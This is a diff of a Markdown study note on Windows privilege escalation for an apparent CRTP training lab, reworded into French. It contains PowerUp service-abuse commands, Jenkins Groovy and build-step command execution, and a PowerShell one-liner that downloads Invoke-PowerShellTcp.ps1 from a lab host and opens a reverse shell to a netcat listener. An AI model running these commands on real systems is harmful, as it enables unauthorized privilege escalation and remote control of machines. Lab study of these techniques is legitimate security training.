@@ -1,23 +1,21 @@
 ---
-title: "2 - Win Privesc"
+title: "2 - Windows Privilege Escalation"
 ---
 
+# Windows Privilege Escalation
 
-# Win Privesc - Local
+## Vecteurs d'élévation locale
 
-> The material of CRTP about Local Privesc is not great
+Configurations et vulnérabilités susceptibles d'accorder des privilèges supplémentaires :
 
-**There are various ways of locally escalating privileges on Windows box**:
-```powershell
-– Missing patches
-– Automated deployment and AutoLogon passwords in clear text
-– AlwaysInstallElevated (Any user can run MSI as SYSTEM)
-– Misconfigured Services
-– DLL Hijacking and more
-– NTLM Relaying a.k.a. Won't Fix
-```
+- Correctifs de sécurité manquants.
+- Déploiement automatisé et mots de passe AutoLogon stockés en clair.
+- AlwaysInstallElevated : configuration pouvant permettre l'installation de fichiers MSI avec les droits SYSTEM.
+- Services mal configurés.
+- DLL Hijacking.
+- NTLM Relaying.
 
-**We can use below tools for complete coverage**:
+## Outils
 
 [PowerSploit - Privesc Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
 
@@ -25,25 +23,28 @@ title: "2 - Win Privesc"
 
 [winPEAS in PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
 
+## Services Windows - PowerUp
 
-## Services Issues using PowerUp
-
-**Get services with unquoted paths and a space in their name**:
+### Unquoted Service Paths
+Identifier les services dont le chemin de l'exécutable contient des espaces et n'est pas entouré de guillemets.
 ```powershell
 Get-ServiceUnquoted -Verbose
 ```
 
-**Get services where the current user can write to its binary path or change arguments to the binary**:
+### Modifiable Service Files
+Identifier les services dont le compte courant peut modifier les fichiers exécutables ou dont les arguments sont modifiables.
 ```powershell
 Get-ModifiableServiceFile -Verbose
 ```
 
-**Get the services whose configuration current user can modify**:
+### Modifiable Services
+Identifier les services dont la configuration est modifiable par le compte courant.
 ```powershell
 Get-ModifiableService -Verbose
 ```
 
-**Run all checks with automated tools** :
+### Audit automatisé
+Exécuter les vérifications proposées par PowerUp, Privesc et winPEAS.
 ```powershell
 # PowerUp:
 Invoke-AllChecks
@@ -55,11 +56,10 @@ Invoke-PrivEsc
 winPEASx64.exe
 ```
 
-## Feature Abuse
-```
-- If you have Admin access (default installation before 2.x), go to http://<jenkins_server>/script
-- In the script console, Groovy scripts could be executed.
-```
+## Jenkins
+### Console Groovy
+La console d'administration Jenkins (`/script`) permet aux utilisateurs autorisés d'exécuter des scripts Groovy.
+Les droits associés à cette console sont particulièrement sensibles.
 
 ```powershell
 def sout = new StringBuffer(), serr = new StringBuffer()
@@ -70,38 +70,40 @@ proc.waitForOrKill(1000)
 println "out> $sout err> $serr"
 ```
 
-If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter:
+### Étapes de build
+Les permissions de modification d'un job Jenkins permettent de définir les actions exécutées lors du build, selon les droits du processus Jenkins.
 ```powershell
 powershell -c <command>
 ```
 
-> Again, you could download and execute scripts, run encoded scripts and more.
+## Exercices de laboratoire
 
+- Étudier les permissions des services Windows et les risques d'élévation locale.
+- Identifier les machines sur lesquelles le compte dispose de droits administrateur locaux.
+- Examiner les risques liés aux permissions Jenkins et aux comptes de service.
 
-**Learning Objective 5**:
-
-- Exploit a service and elevate privileges to local administrator.
-- Identify a machine in the domain where ur user has local administrative access.
-- Using privileges of a user on Jenkins get admin privileges on another server.
-
-
-**[easy to detect]**
+### Services Windows
+Exemple du laboratoire associé aux permissions de service.
 ```powershell
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username dcorp\studentx -Verbose
 net localgroup Administrators
 ```
 
-**[easy to detect - noise]**
+### Droits administrateur distants
+Vérification des droits locaux via PowerShell Remoting.
 ```powershell
 Find-PSRemotingLocalAdminAccess
 ```
 
+### Exécution distante
+Exemple original du laboratoire Jenkins.
 ```powershell
 on Jenkins> powershell iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcp.ps1); power -Reverse -IPAddress 172.16.100.1 -Port 443
 on Attacker> host the file in a webserver - example: HFS - HTTP File Server 
 ```
 
-disable firewall or add exception
+### Connexion réseau
+Vérifier les règles de filtrage réseau applicables dans le laboratoire.
 ```powershell
 on Attacker> netcat-win32-1.12.exe -lvp 443
 ```
